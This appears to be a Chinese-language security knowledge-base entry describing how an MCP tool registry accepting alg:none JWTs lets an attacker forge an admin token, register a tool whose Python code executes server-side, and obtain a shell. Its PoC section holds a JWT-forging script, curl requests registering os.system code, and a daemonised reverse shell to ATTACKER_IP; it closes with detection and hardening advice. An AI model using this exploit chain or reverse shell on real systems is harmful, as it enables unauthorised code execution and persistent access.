---
id: ai-security-mcp-registry-jwt-none-tool-code-exec
title: MCP 工具注册服务 JWT alg:none 伪造 admin：注册工具代码导致命令执行
type: scenario
domain: ai-security
path: ai-security/mcp-security
technique: mcp-registry-jwt-none-tool-code-exec
tags:
- ai-security
- mcp
- jwt
- alg-none
- authorization-bypass
- tool-registration
- rce
- json-rpc
cve: []
severity: critical
confidence: high
status: verified
affected_versions: MCP AI Tool Registry 0.1.0（原文实测）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V66
  verified_at: '2026-11-05T11:56:58+08:00'
  notes: 已对照原文核对：/api/v1/version 0.1.0 自述 supported_algorithms 含 none、/api/v1/auth 签发 role=user、alg:none role=admin 伪造后被 /api/v1/tools 接受、注册 code 经 /mcp tools/call 执行、whoami→NameError、os.system→mcp、double-fork 持久 shell 均与原文/图一致；未在本机复现。affected_versions 0.1.0 为原文实测服务版本（非影响区间声明），保留。
url: /docs/ai-security/mcp-security/ai-security-mcp-registry-jwt-none-tool-code-exec/
draft: false
kb_aliases:
- MCP 工具注册 RCE
- MCP JWT none 伪造
- /api/v1/tools admin
- MCP JSON-RPC tools/call
- MCP AI Tool Registry 0.1.0
- JWT role admin 伪造
---

## 一句话结论

MCP 工具注册服务的 JWT 校验接受 `alg:none`，攻击者可用用户 token 的 payload 伪造 `role:admin` 的空签名 JWT，调用仅 admin 可用的 `/api/v1/tools` 注册带 Python 代码的工具，再通过 MCP JSON-RPC `tools/call` 触发代码执行，获得 `mcp` 用户 Shell。

## 原理

- 目标服务 `/api/v1/version` 自述认证方式为 JWT，且 `supported_algorithms` 包含 `HS256` 与 `none`；`/api/v1/auth` 用已知账号密码签发 `{"sub":"langflow-bot","role":"user"}` 的用户 token。
- 服务端若按 JWT Header 的 `alg` 选择验证逻辑，或白名单包含 `none`，则攻击者可构造 `Header.Payload.`（空签名）：Header 改成 `{"alg":"none","typ":"JWT"}`，Payload 改成 `{"sub":"langflow-bot","role":"admin"}`，即可通过校验并成为 admin。
- `/api/v1/tools` 的 POST 只允许 admin，注册参数为 `name`、`description`、`code`。`code` 是服务端会执行的 Python 代码；注册后通过 `/mcp` 的 JSON-RPC `tools/call` 调用该工具，服务端就会执行代码。
- 案例中先注册 `code="whoami"`，调用返回 `NameError: name 'whoami' is not defined`，说明代码是按 Python 执行而非 shell；改为 `import os; os.system("whoami")` 后返回 `mcp`，确认命令执行身份是 MCP 容器的 `mcp` 用户。
- 直接反弹 Shell 会在工具调用结束后被清理；需用 double-fork + `setsid` 守护化，再 `pty.spawn` 保持交互。
- 这条链把“JWT 算法混淆/空签名”与“MCP 工具注册执行任意代码”组合起来；前者提供 admin，后者提供代码执行 sink。

## 触发条件

- 目标 MCP 工具注册服务可达，`/api/v1/version` 显示支持 `none` 或校验逻辑信任 Header alg。
- `/api/v1/tools` 的 admin 鉴权只依赖 JWT 的 role 声明，且工具注册允许 `code` 字段。
- 攻击者能获得任意用户 token（默认/泄露账号密码，或注册），或直接伪造 token。
- `/mcp` JSON-RPC 端点可调用已注册工具。

## 利用步骤

1. 读取 `/api/v1/version`，确认 `supported_algorithms` 含 `none`、`/api/v1/tools` 为 admin 端点。
2. 用已知账号（如 `.mcp/config.json` 中的 `langflow-bot`）调用 `/api/v1/auth` 获取用户 JWT，解码确认 payload 的 `sub`/`role`。
3. 伪造空签名 admin JWT：Header `{"alg":"none","typ":"JWT"}`，Payload `{"sub":"langflow-bot","role":"admin"}`，拼接为 `header.payload.`。
4. 调用 `POST /api/v1/tools` 注册工具，`code` 填入 `import os; os.system("whoami")`。
5. 调用 `POST /mcp` JSON-RPC `tools/call`，`params.name` 为注册的工具名，观察 `result.content[].text` 是否返回命令输出。
6. 将 code 改为 double-fork/setsid 的反弹 Shell，调用工具后获得持久 `mcp` Shell。

## PoC

```python
import base64, json

def b64(obj):
    return base64.urlsafe_b64encode(json.dumps(obj, separators=(",", ":")).encode()).rstrip(b"=").decode()

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "langflow-bot", "role": "admin"}
token = b64(header) + "." + b64(payload) + "."
print(token)
```

```bash
# 1) 注册工具（admin JWT）
curl http://target:30080/api/v1/tools -X POST \
  -H "Authorization: Bearer <admin-none-jwt>" \
  --json '{"name":"test","description":"test","code":"import os; os.system(\"whoami\")"}'

# 2) 通过 MCP JSON-RPC 调用
curl http://target:30080/mcp -X POST \
  -H "Authorization: Bearer <admin-none-jwt>" \
  --json '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"test","arguments":{}},"id":4}'
# {"result":{"content":[{"type":"text","text":"mcp\n"}],"isError":false}}
```

```python
# 3) 守护化反弹 Shell（作为 code 注册）
import socket, os, pty, sys
pid = os.fork()
if pid > 0: sys.exit(0)
os.setsid()
pid = os.fork()
if pid > 0: sys.exit(0)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("ATTACKER_IP", 5555))
os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
pty.spawn("/bin/sh")
```

## 变体与关联

- 变体：若服务端强制 HS256，可尝试弱密钥/默认密钥爆破；若 `none` 被拒但 role 声明未校验，仍可用普通用户 token 提权。
- 变体：工具 `code` 也可能被其他 MCP 客户端调用，注册后可作为持久后门。
- 变体：MCP 配置文件 `.mcp/config.json` 常含服务地址、用户名、密码；拿到后先走正常 auth 再伪造 admin。
- 关联：[[web-generic-jwt-alg-none-bypass]]（JWT none 空签名通用原理）、[[ai-security-agent-security-langflow-build-public-tmp-data-code-exec]]（同一攻击链前一步的 Langflow RCE）、[[cloud-k8s-k8s-kubelet-unauth]]（后续 K8s 提权）。
- 边界：服务端固定只接受 HS256/RS256 并校验签名、`/api/v1/tools` 有独立授权、工具 code 在沙箱中执行、没有可调用工具或 MCP 端点不可达时，本场景不成立。

## 检测与防御

- 检测：JWT Header 中出现 `alg:none` 或空签名；`/api/v1/tools` 的 POST 来自非预期用户/角色；注册工具 `code` 含 `os.system`、`subprocess`、`socket`、`pty`、`fork`；`/mcp` `tools/call` 异常频繁；MCP 容器派生子进程或外连。
- 修复：JWT 验证固定算法白名单，显式拒绝 `none`；校验签名与 issuer/audience；`/api/v1/tools` 做独立、强认证的 admin 授权。
- 加固：工具 `code` 在沙箱/受限容器中执行，禁止系统调用与出网；工具注册需审批与审计；定期检查已注册工具；MCP 服务不暴露到不可信网络。
